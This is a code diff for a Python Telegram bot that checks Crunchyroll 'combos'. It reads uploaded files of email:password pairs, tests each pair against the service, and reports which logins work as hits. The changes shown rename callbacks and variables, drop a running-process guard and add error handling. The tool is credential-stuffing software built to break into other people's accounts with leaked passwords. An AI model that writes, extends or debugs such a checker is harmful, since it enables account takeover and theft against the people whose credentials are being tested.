@@ -16,12 +16,6 @@ def process_crunchytxt_command(bot, message):
     bot.send_message(message.chat.id, "Please send your txt file with combo data.")
 
 def handle_crunchytxt_docs(bot, message):
-    global process_running
-    if process_running:
-        bot.send_message(message.chat.id, "A process is already running. Please wait until it's finished.")
-        return
-
-    process_running = True
     try:
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
@@ -35,15 +29,16 @@ def handle_crunchytxt_docs(bot, message):
         total_combos = len(combo_list)
         start_time = time.time()
 
+        # Creating inline keyboard for showing results
         keyboard = types.InlineKeyboardMarkup(row_width=1)
         keyboard.add(
-            types.InlineKeyboardButton(text="HIT ✅", callback_data='hit_crunchytxt'),
-            types.InlineKeyboardButton(text="Dead ❌", callback_data='dead_crunchytxt'),
-            types.InlineKeyboardButton(text="Cancel ❌", callback_data='cancel_crunchytxt')
+            types.InlineKeyboardButton(text="HIT ✅", callback_data='hit'),
+            types.InlineKeyboardButton(text="Dead ❌", callback_data='dead'),
+            types.InlineKeyboardButton(text="Cancel ❌", callback_data='cancel')
         )
 
         initial_message = (
-            f"↯ CRUNCHYROLL COMBO CHECKER\n\n"
+            f"↯ CRUNCHYTROLL COMBO CHECKER\n\n"
             f"COMBO CHECKING:\n"
             f"• HIT ✅: [0] •\n"
             f"• Dead ❌: [0] •\n"
@@ -58,20 +53,20 @@ def handle_crunchytxt_docs(bot, message):
 
         msg = bot.send_message(message.chat.id, initial_message, reply_markup=keyboard)
 
-        hits.clear()
-        dead.clear()
+        hits = []
+        dead = []
 
         for combo in combo_list:
             if ':' in combo:
-                user, pwd = combo.strip().split(':', 1)
-                result = check_crunchytxt_combo(user, pwd)
+                email, pwd = combo.strip().split(':', 1)
+                result = check_crunchytxt_combo(email, pwd)
                 if "HIT" in result:
                     hits.append((combo.strip(), result))
                 else:
                     dead.append((combo.strip(), result))
 
-                new_message = (
-                    f"↯ CRUNCHYROLL COMBO CHECKER\n\n"
+                current_message = (
+                    f"↯ CRUNCHYTROLL COMBO CHECKER\n\n"
                     f"COMBO CHECKING:\n{combo.strip()}\n\n"
                     f"• HIT ✅: [{len(hits)}] •\n"
                     f"• Dead ❌: [{len(dead)}] •\n"
@@ -83,14 +78,14 @@ def handle_crunchytxt_docs(bot, message):
                     f"⚡️ Bot by - AFTAB 👑\n"
                     f"－－－－－－－－－－－－－－－－"
                 )
-
-                if new_message != current_message:
-                    current_message = new_message
-                    bot.edit_message_text(current_message, chat_id=msg.chat.id, message_id=msg.message_id, reply_markup=keyboard)
+                bot.edit_message_text(current_message, chat_id=msg.chat.id, message_id=msg.message_id, reply_markup=keyboard)
             else:
                 dead.append((combo.strip(), "Invalid format"))
 
         bot.edit_message_text(current_message, chat_id=msg.chat.id, message_id=msg.message_id, reply_markup=keyboard)
+
+    except Exception as e:
+        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")
         
 def handle_crunchytxt_callback_query(call, bot):
     global cancel_check
